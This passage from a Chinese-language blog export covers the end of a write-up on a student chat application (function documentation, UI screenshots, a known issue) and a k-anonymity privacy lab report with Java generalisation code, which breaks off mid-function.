<p>首先获取user_id，调用数据库的in_room函数判断用户是否已在群中，若已在则提示用户“已在群里了“，调用数据库的get_room函数判断群聊是否存在，若不存在提示用户”群不存在“，否则调用add_to_room将用户加入到群聊中，并向客户端发送MessageType.contact_info，使用户在好友列表中显示该群聊。</p>
</li>
</ul>
</li>
<li><p>get_user(user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\__init__.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>int型，表示该用户的用户id</li>
</ul>
</li>
<li><p>功能</p>
<p>获取数据库中users表中id值为user_id的那一行的所有数据。</p>
</li>
<li><p>算法描述</p>
<p>执行数据库查询语句返回一行结果。若无结果返回空。</p>
</li>
</ul>
</li>
<li><p>get_pending_friend_request(user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_Id,int类型，表示某一个用户的id值。</li>
</ul>
</li>
<li><p>功能</p>
<p>返回一个列表，列表中的内容为加user_id的用户的好友们的个人信息。</p>
</li>
<li><p>算法描述</p>
<p>从数据库中查询friends表，to_user_id为user_id的行中且为accepted=1的获取from_user，用get_user函数查询他们的信息并append到列表中。</p>
</li>
</ul>
</li>
<li><p>get_friends(user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_Id,int类型，表示某一个用户的id值。</li>
</ul>
</li>
<li><p>功能</p>
<p>类似get_pending_friend_request(user_id)函数，只是会返回‘我’加谁为好友且accept的用户信息。</p>
</li>
<li><p>算法描述</p>
<p>从数据库中查询friends表，from_user_id为user_id的行中且为accepted=1的获取to_user，用get_user函数查询他们的信息并append到列表中。</p>
</li>
</ul>
</li>
<li><p>get_room(room_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>room_id，int类型，表示一个room的id值</li>
</ul>
</li>
<li><p>功能</p>
<p>返回群聊id为room_id的群聊房间在rooms表中的所有信息的字典，包括id,名字</p>
</li>
<li><p>算法描述</p>
<p>从数据库中查询room表，返回对应room_id的room的全部信息，压缩为字典并返回。</p>
</li>
</ul>
</li>
<li><p>get_user_rooms(user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_Id,int类型，表示某一个用户的id值。</li>
</ul>
</li>
<li><p>功能</p>
<p>返回一个字典，列表中内容为user_id用户加入的群聊的room的全部信息。</p>
</li>
<li><p>算法描述</p>
<p>从数据库中查询room_user表，返回对应user_id的room的全部信息值，变成字典中并返回。</p>
</li>
</ul>
</li>
<li><p>get_user_rooms_id(user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_Id,int类型，表示某一个用户的id值。</li>
</ul>
</li>
<li><p>功能</p>
<p>返回一个列表，列表中内容为user_id用户加入的群聊的room_id。</p>
</li>
<li><p>算法描述</p>
<p>从数据库中查询room_user表，返回对应user_id的room_id的全部信息值，append入列表中并返回。</p>
</li>
</ul>
</li>
<li><p>is_friend_with(from_user_id,to_user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>from_user_id为好友发起请求方</li>
<li>to_user_id为接收好友请求方</li>
</ul>
</li>
<li><p>功能</p>
<p>返回一个判断值1或者0.判断两者是否为朋友。</p>
</li>
<li><p>算法描述</p>
<p>从friends表中查询有无两者建立关系的一行，若没有，则返回0表示不是好友。</p>
</li>
</ul>
</li>
<li><p>in_room(user_id,room_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_id为待检查用户</li>
<li>room_id为待检查群聊号</li>
</ul>
</li>
<li><p>功能</p>
<p>判断user_id用户是否在room_id的群聊中。</p>
</li>
<li><p>算法描述</p>
<p>从room_user表中查询有无两者建立关系的一行，若没有，则返回0表示不是不在群聊中。</p>
</li>
</ul>
</li>
<li><p>add_to_room(user_id,room_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_id为待检查用户</li>
<li>room_id为待检查群聊号</li>
</ul>
</li>
<li><p>功能</p>
<p>将用户id为user_id的用户加入到room_id的群聊中。</p>
</li>
<li><p>算法描述</p>
<p>数据库insert将user_id插入到room_id的room_user表中。</p>
</li>
</ul>
</li>
<li><p>get_room_members_id(room_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>room_id为待检查群聊号</li>
</ul>
</li>
<li><p>功能</p>
<p>获取群聊中的所有用户id。</p>
</li>
<li><p>算法描述</p>
<p>select逐一查询，将结果返回入列表。</p>
</li>
</ul>
</li>
<li><p>add_to_chat_history(user_id,target_id,target_type,data,sent)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_Id是发送者id</li>
<li>target_id是目标用户id</li>
<li>target_type是数据类型，0表示文本信息，1表示图像文件信息</li>
<li>data是传输存储的数据</li>
<li>sent标志位记录是否发送成功。若为0，下一次还会再发送。</li>
</ul>
</li>
<li><p>功能</p>
<p>将聊天信息加入到正确用户的数据库中。</p>
</li>
<li><p>算法描述</p>
<p>将相关信息insert入表chat_history中。</p>
</li>
</ul>
</li>
<li><p>get_chat_history(user_id)</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\util\database\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>user_id为待检查用户</li>
</ul>
</li>
<li><p>功能</p>
<p>获取user_id用户的聊天记录。</p>
</li>
<li><p>算法描述</p>
<p>select查询并更新sent标志位。</p>
</li>
</ul>
</li>
</ol>
<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><ol>
<li><p>注册页面</p>
<p>对输入的用户名、密码、邮箱、确认密码等进行检查，用户名和密码限制输入非法字符，邮箱限制输入为 <a href="mailto:&#x78;&#120;&#x78;&#x40;&#120;&#120;&#x78;&#x2e;&#120;&#120;&#x78;">xxx@xxx.xxx</a> 形式，同时限制输入的用户名长度不大于 8 个，允许中文输入。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714145452.png"></p>
</li>
<li><p>登录页面</p>
<p>对输入的用户名和密码进行检查，限制输入非法字符，同 时限制输入的用户名长度不大于 8 个，允许中文输入。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714145528.png"></p>
</li>
<li><p>好友列表</p>
<p>好友列表会显示所有好友的在线状态、IP 地址、端口号、最新消息和未读消息， 好友列表根据用户离线、在线情况对列表进行刷新,将在线和最近聊天用户置顶。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714145654.png"></p>
</li>
<li><p>添加好友</p>
<ol>
<li><p>添加好友时需要输入用户名，同时会对输入的信息进行合法性检查，不能添加自 己为好友。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714145755.png"></p>
</li>
<li><p>要添加的好友用户名必须为已经注册的用户，否则会显示用户名不存在。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714145832.png"></p>
</li>
<li><p>输入正确用户名并点击 OK 后，会显示好友请求已发送。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714145916.png"></p>
</li>
<li><p>如果在线，会显示好友请求，点击 YSE 后，会在双方的好友列表中添加；点击 NO 后两个用户无法成为好友；点击 cancle 后，下次登陆时会再次弹出好友请求框。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150022.png"></p>
</li>
</ol>
</li>
<li><p>删除好友</p>
<ol>
<li><p>与添加好友相同，需要输入用户名，同时会对输入的信息进行合法性检查，不能删 除自己。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150145.png"></p>
</li>
<li><p>不能删除好友列表中不存在的用户。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150237.png"></p>
</li>
<li><p>输入正确用户名并点击 OK 后，会显示成功删除好友，并且好友列表进行刷新删除 刚刚删除的好友信息，删除用户也会对好友列表进行刷新,即双方向删除。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150347.png"></p>
</li>
</ol>
</li>
<li><p>添加群聊</p>
<p>需要输入要添加的群聊的群号，同时会对输入的信息进行合法性检查，如果群号 不存在则无法添加，同样如果已经在群聊中，会显示已经在群聊中。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150443.png"></p>
</li>
<li><p>创建群聊</p>
<p>需要输入创建的群聊的群名称，同时会对输入的信息进行合法性检查，如果群名 称已存在，则无法创建，创建成功后会分配一个群号。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150547.png"></p>
</li>
<li><p>群聊界面</p>
<ol>
<li><p>在群聊界面中，用户可以直接发送消息，也可以点击发送文件按钮发送文件，聊天 框会显示用户名、发送时间和消息内容，不同用户名颜色不同，历史消息会进行缓 存，用户再次打开聊天框时会直接显示。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150653.png"></p>
</li>
<li><p>用户可以根据自己的习惯更改字体大小。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150733.png"></p>
</li>
<li><p>用户可以根据自己的习惯更改字体颜色。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150811.png"></p>
</li>
</ol>
</li>
<li><p>用户聊天界面</p>
<p>和群聊界面基本相同，用户聊天内容会缓存到客户端文件夹中，发送的文件会存 储到专用文件夹中，如下图。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714150901.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714151012.png"></p>
</li>
</ol>
<h2 id="待优化"><a href="#待优化" class="headerlink" title="待优化"></a>待优化</h2><p>正常信息交互流程，server 端会返回加密数据，此时 client 会一直等待接收 （while true）。如果发的太大，server 端加密不出来，client 一直监听，导致 client 无法再次发起操作。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714151144.png"></p>
<p>以正常的发送图片数据抓包为例子，server 会不断接收，然后做加密。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714151209.png"></p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p><a href="https://github.com/Leeyuxun/UChat">源代码</a></p>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>安全即时通讯软件</tag>
      </tags>
  </entry>
  <entry>
    <title>k-匿名隐私保护实验</title>
    <url>/k-%E5%8C%BF%E5%90%8D%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>理解基本的k-匿名算法；</li>
<li>通过相关程序实现对数据表元组的k-匿名处理；</li>
</ol>
<span id="more"></span>

<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ul>
<li><p>编程语言：Java</p>
</li>
<li><p>硬件设备：IDEA，JDK版本1.8  </p>
</li>
</ul>
<h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="k-匿名的核心思想"><a href="#k-匿名的核心思想" class="headerlink" title="k-匿名的核心思想"></a>k-匿名的核心思想</h2><p>K-匿名的核心思想是设法切断数据表中准标识符与敏感属性之间的一对一关系来保护隐私属性。使得在一个数据表中，一条记录的准标识符至少有k-1条记录的准标识符与之相同。即如果使用准标识符查询的话，我们得到的查询结果应至少包含k条记录，并且这k条记录的准标识符完全相同，攻击者进而无法通过准标识符推理出隐私数据。</p>
<h2 id="基本的k-匿名算法"><a href="#基本的k-匿名算法" class="headerlink" title="基本的k-匿名算法"></a>基本的k-匿名算法</h2><ul>
<li>输入：原始数据表T<sub>p</sub>, 匿名参数k；</li>
<li>输出：满足k-匿名的数据表T<sub>k</sub>；</li>
<li>步骤：<ol>
<li>从T<sub>p</sub>中依次读取k条记录；</li>
<li>针对原始记录的属性信息对标识符和不希望发布的信息做抑制处理；</li>
<li>对准标识符中的属性进行泛化，直到k条记录的准标识符完全相同，将处理后的这k条记录存入到T<sub>k</sub>中；</li>
<li>重复1-3步骤，直到数据全部被处理，若剩余的记录不足k条做抑制处理；  </li>
</ol>
</li>
</ul>
<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol>
<li>给定原始数据集，根据基本的k-匿名算法编写程序对其实现简单的k-匿名处理，使得匿名化处理后的表通过准标识符查询出来的记录至少有k条；</li>
<li>给出实验报告说明和源代码；</li>
</ol>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li><p>没有按照实验教程给出的步骤去做，做了一点创新，重新生成了一个新的数据文件及集org，共有1000条数据，由于数据量比较大，这里不做展示，已经放在了附件中；</p>
</li>
<li><p>编写k-匿名处理程序对原始数据集进行k-匿名处理，假设k=2，在原始数据集中按顺序依次选择2条数据记录后，首先需要去除这2条数据记录中的标识符属性No，使之不会出现在k-匿名后的数据记录中，接着需要对这2条数据记录中的准标识符属性<code>idNumber</code>、<code>sex</code>、<code>age</code>、<code>height</code>进行泛化处理。</p>
</li>
<li><p>这里做的和实验指导上的不相同，实验指导上没有将<code>idNumber</code>列为准标识符，本实验也没有将它作为准标识符属性，身份证号是每个人的唯一标志，不能作为准标识符。但是为了提高数据的匿名性，本实验将<code>idNumber</code>的第一个字符作为准标识符，即产生了四个准标识符，具体如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Operation.java */</span></span><br><span class="line">    <span class="comment">//只读取org文件中idNumber的第一位到setIdNumber中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; org_list.size(); i++) &#123;</span><br><span class="line">        Org org=<span class="keyword">new</span> <span class="title class_">Org</span>();</span><br><span class="line">        String org_ori=org_list.get(i);</span><br><span class="line">        String elements[]=org_ori.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        org.setNo(Integer.parseInt(elements[<span class="number">0</span>]));</span><br><span class="line">        org.setIdNumber(elements[<span class="number">1</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setSex(elements[<span class="number">2</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setAge(Integer.parseInt(elements[<span class="number">3</span>]));</span><br><span class="line">        org.setHeight(Integer.parseInt(elements[<span class="number">4</span>]));</span><br><span class="line">        org.setDisease(elements[<span class="number">5</span>]);</span><br><span class="line">        orgs.add(org);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对k条记录中的准标识符进行泛化处理,包括idNumber的第一位idNumberFirst</span></span><br><span class="line">	K temp=generalize(org_k);  </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>; m &lt; k; m++) &#123;</span><br><span class="line">		K out=<span class="keyword">new</span> <span class="title class_">K</span>();</span><br><span class="line">		out.setIdNumberFirst(temp.getIdNumberFirst());</span><br><span class="line">		out.setSex(temp.getSex());</span><br><span class="line">		out.setAge(temp.getAge());</span><br><span class="line">		out.setHeight(temp.getHeight());</span><br><span class="line">		out.setDisease(org_k.get(m).getDisease());</span><br><span class="line">		results.add(out);  </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//选取k条记录中的第一条记录的属性值作为上述标志属性的默认值，包括idNumberFirst</span></span><br><span class="line">	<span class="keyword">if</span>(org_k.indexOf(i)==<span class="number">0</span>) &#123;</span><br><span class="line">		idNumberFirst_flag=i.getIdNumberFirst();</span><br><span class="line">		sex_flag=i.getSex();</span><br><span class="line">		age_min=i.getAge();</span><br><span class="line">		age_max=i.getAge();</span><br><span class="line">		height_min=i.getHeight();</span><br><span class="line">		height_max=i.getHeight();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断idNumberFirst属性的取值是否一致</span></span><br><span class="line">	String idNumberFirst=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(idNumberFirst_flag!=i.getIdNumberFirst()) </span><br><span class="line">        idNumberFirst_flag=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果k条记录的idNumberFirst属性的取值有不一致的，就均设为*，否则不变</span></span><br><span class="line">	<span class="keyword">if</span>(idNumberFirst_flag == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        idNumberFirst=<span class="string">&quot;*&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        idNumberFirst=<span class="string">&quot;&quot;</span>+idNumberFirst_flag;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Org.java */</span></span><br><span class="line">	<span class="comment">//在org.java中添加idNumberFirst，并添加函数获取和发送idNumberFirst</span></span><br><span class="line">	<span class="keyword">private</span> <span class="type">char</span> idNumberFirst;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getIdNumberFirst</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> idNumberFirst;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIdNumber</span><span class="params">(<span class="type">char</span> idNumberFirst)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.idNumberFirst = idNumberFirst;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* k.java */</span></span><br><span class="line">	<span class="comment">//在k.java中添加idNumberFirst，并添加函数获取和发送idNumberFirst</span></span><br><span class="line">	<span class="keyword">private</span> String idNumberFirst;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getIdNumberFirst</span><span class="params">()</span> &#123;</span><br><span class="line">    	<span class="keyword">return</span> idNumberFirst;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIdNumberFirst</span><span class="params">(String idNumberFirst)</span> &#123;</span><br><span class="line">    	<span class="built_in">this</span>.idNumberFirst = idNumberFirst;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>经过k-匿名处理后，输出了1000条数据记录，但每条记录中只剩下泛化后的准标识符属性值和敏感属性值，理论上通过任意一组准标识符属性查询到的数据记录均有两条，用来切断准标识符属性和敏感属性的一对一关系，满足了k-匿名的处理要求，这里开始按照实验指导书上的要求做完实验后满足上述要求，但是由于自己做了创新后，输出1000条数据，没法准确判断，这里做数据截图如下，生成的完整数据会放到附件里，这里加入一个准标识符后比之前匿名化提供的信息更多；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191205003115.png"></p>
</li>
</ol>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol>
<li><p>运行<code>DataGerenerate.java</code>生成1000条数据集合org；</p>
</li>
<li><p>设置匿名参数<code>k=2</code>；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> k=<span class="number">2</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>创建<code>operation</code>对象，用于调用其内部的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Operation operation=<span class="keyword">new</span> <span class="title class_">Operation</span>();</span><br></pre></td></tr></table></figure></li>
<li><p>获取原始数据集记录，并用<code>ArrayList</code>进行存储；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Org&gt;  org_lists=operation.getOrgData();</span><br><span class="line"><span class="comment">//读取原始的数据集</span></span><br><span class="line"><span class="keyword">public</span> ArrayList&lt;Org&gt; <span class="title function_">getOrgData</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> 	ArrayList&lt;String&gt; org_list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"> 	File file=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/k_anonymity/org&quot;</span>);</span><br><span class="line"> 	<span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    FileReader fReader=<span class="keyword">new</span> <span class="title class_">FileReader</span>(file);</span><br><span class="line">    BufferedReader bufferedReader=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(fReader);</span><br><span class="line">    String str;</span><br><span class="line">    <span class="comment">// 按行读取字符串</span></span><br><span class="line">    <span class="keyword">while</span> ((str = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        org_list.add(str);</span><br><span class="line">    &#125;</span><br><span class="line">    bufferedReader.close();</span><br><span class="line">    fReader.close();</span><br><span class="line">    ArrayList&lt;Org&gt; orgs=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Org&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; org_list.size(); i++) &#123;</span><br><span class="line">        Org org=<span class="keyword">new</span> <span class="title class_">Org</span>();</span><br><span class="line">        String org_ori=org_list.get(i);</span><br><span class="line">        String elements[]=org_ori.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        org.setNo(Integer.parseInt(elements[<span class="number">0</span>]));</span><br><span class="line">        org.setIdNumber(elements[<span class="number">1</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setSex(elements[<span class="number">2</span>].charAt(<span class="number">0</span>));</span><br><span class="line">        org.setAge(Integer.parseInt(elements[<span class="number">3</span>]));</span><br><span class="line">        org.setHeight(Integer.parseInt(elements[<span class="number">4</span>]));</span><br><span class="line">        org.setDisease(elements[<span class="number">5</span>]);</span><br><span class="line">        orgs.add(org);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> orgs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>对原始数据进行k-匿名化处理；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;K&gt; results=operation.k_anonymous(org_lists, k);</span><br><span class="line"><span class="comment">//k-匿名处理</span></span><br><span class="line"><span class="keyword">public</span> ArrayList&lt;K&gt; <span class="title function_">k_anonymous</span><span class="params">(ArrayList&lt;Org&gt; org_lists, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	<span class="comment">//用于存放匿名化后的数据</span></span><br><span class="line">	ArrayList&lt;K&gt; results=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;K&gt;();</span><br><span class="line">	<span class="comment">//存放临时选取的k个原始记录</span></span><br><span class="line">	ArrayList&lt;Org&gt; org_k=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Org&gt;();</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (Org j : org_lists) &#123;</span><br><span class="line">		org_k.add(j);</span><br><span class="line">		i++;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//对k条记录中的准标识符进行泛化处理</span></span><br><span class="line">            K temp=generalize(org_k);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>; m &lt; k; m++) &#123;</span><br><span class="line">                K out=<span class="keyword">new</span> <span class="title class_">K</span>();</span><br><span class="line">                out.setIdNumberFirst(temp.getIdNumberFirst());</span><br><span class="line">                out.setSex(temp.getSex());</span><br><span class="line">                out.setAge(temp.getAge());</span><br><span class="line">                out.setHeight(temp.getHeight());</span><br><span class="line">                out.setDisease(org_k.get(m).getDisease());</span><br><span class="line">                results.add(out);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//清除已经处理过的k个记录，用于存储下次选取的k条记录</span></span><br><span class="line">            org_k.clear(); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>对原始数据中的准标识符进行泛化；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对原始数据中的准标识符进行泛化</span></span><br><span class="line">	<span class="keyword">private</span> K <span class="title function_">generalize</span><span class="params">(ArrayList&lt;Org&gt; org_k)</span> &#123;</span><br><span class="line">		K temp=<span class="keyword">new</span> <span class="title class_">K</span>();</span><br><span class="line">		<span class="type">char</span> idNumberFirst_flag=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="type">char</span> sex_flag=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="type">int</span> age_min=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> age_max=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> height_min=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> height_max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (Org i : org_k) &#123;</span><br><span class="line">			<span class="comment">//选取k条记录中的第一条记录的属性值作为上述标志属性的默认值</span></span><br><span class="line">			<span class="keyword">if</span>(org_k.indexOf(i)==<span class="number">0</span>) &#123;</span><br><span class="line">				idNumberFirst_flag=i.getIdNumberFirst();</span><br><span class="line">				sex_flag=i.getSex();</span><br><span class="line">				age_min=i.getAge();</span><br><span class="line">				age_max=i.getAge();</span><br><span class="line">				height_min=i.getHeight();</span><br><span class="line">				height_max=i.getHeight();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//判断idNumberFirst属性的取值是否一致</span></span><br><span class="line">			<span class="keyword">if</span>(idNumberFirst_flag!=i.getIdNumberFirst()) </span><br><span class="line">                idNumberFirst_flag=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">			<span class="comment">//判断sex属性的取值是否一致</span></span><br><span class="line">			<span class="keyword">if</span>(sex_flag!=i.getSex())</span><br><span class="line">                sex_flag=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">			<span class="comment">//判断Age的取值范围</span></span><br><span class="line">			<span class="keyword">if</span>(age_min&gt;i.getAge())</span><br><span class="line">                age_min=i.getAge();</span><br><span class="line">			<span class="keyword">if</span>(age_max&lt;i.getAge())</span><br><span class="line">                age_max=i.getAge();</span><br><span class="line">			<span class="comment">//判断height的取值范围</span></span><br><span class="line">			<span class="keyword">if</span>(height_min&gt;i.getHeight())</span><br><span class="line">                height_min=i.getHeight();</span><br><span class="line">			<span class="keyword">if</span>(height_max&lt;i.getHeight())</span><br><span class="line">                height_max=i.getHeight();</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">		String idNumberFirst=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		String sex=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		String age=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		String height=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//如果k条记录的idNumberFirst属性的取值有不一致的，就均设为*，否则不变</span></span><br><span class="line">		<span class="keyword">if</span>(idNumberFirst_flag == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            idNumberFirst=<span class="string">&quot;*&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">            idNumberFirst=<span class="string">&quot;&quot;</span>+idNumberFirst_flag;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//如果k条记录的sex属性的取值有不一致的，sex就均设为*，否则不变</span></span><br><span class="line">		<span class="keyword">if</span>(sex_flag == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            sex=<span class="string">&quot;*&quot;</span>;   </span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">            sex=<span class="string">&quot;&quot;</span>+sex_flag;  </span><br><span class="line">		</span><br><span class="line">		<span class="comment">//如果k条记录中年龄的最大值和最小值相等</span></span><br><span class="line">		<span class="keyword">if</span>(age_min%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; age_max%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; age_min==age_max ) </span><br><span class="line">        &#123;</span><br><span class="line">			age_min=(age_min/<span class="number">10</span>)*<span class="number">10</span>;</span><br><span class="line">			age_max=age_min+<span class="number">5</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		age=age_min+<span class="string">&quot;~&quot;</span>+age_max;   </span><br><span class="line">		